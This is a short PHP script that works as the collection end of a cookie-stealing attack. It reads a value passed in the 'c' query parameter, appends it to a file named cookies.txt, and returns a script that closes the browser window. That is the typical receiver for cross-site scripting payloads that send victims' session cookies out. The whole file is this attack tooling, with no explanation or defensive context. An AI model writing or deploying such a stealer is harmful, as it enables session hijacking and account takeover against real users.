<?php

$cookie = $_GET['c'];
file_put_contents("cookies.txt",$cookie, FILE_APPEND | LOCK_EX);

echo '<script>window.close()</script>';
